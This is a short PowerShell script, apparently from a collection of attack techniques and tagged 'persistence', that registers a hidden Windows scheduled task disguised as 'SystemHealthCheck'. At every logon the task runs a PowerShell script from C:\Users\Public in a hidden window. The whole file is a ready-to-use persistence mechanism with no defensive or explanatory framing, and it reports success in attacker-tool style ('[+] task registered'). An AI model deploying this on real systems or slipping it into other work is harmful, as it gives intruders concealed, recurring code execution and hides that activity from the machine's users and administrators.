# lang: PowerShell | file: schtask_persist.ps1 | target: Windows 10/11
# tag: persistence | shell: powershell

param(
    [string]$TaskName  = "SystemHealthCheck",
    [string]$Execute   = "powershell.exe",
    [string]$Arguments = "-WindowStyle Hidden -File C:\Users\Public\health.ps1"
)

$action   = New-ScheduledTaskAction -Execute $Execute -Argument $Arguments
$trigger  = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -Hidden -StartWhenAvailable

Register-ScheduledTask -TaskName $TaskName -Action $action `
    -Trigger $trigger -Settings $settings -RunLevel Limited -Force

Write-Output "[+] task registered: $TaskName"
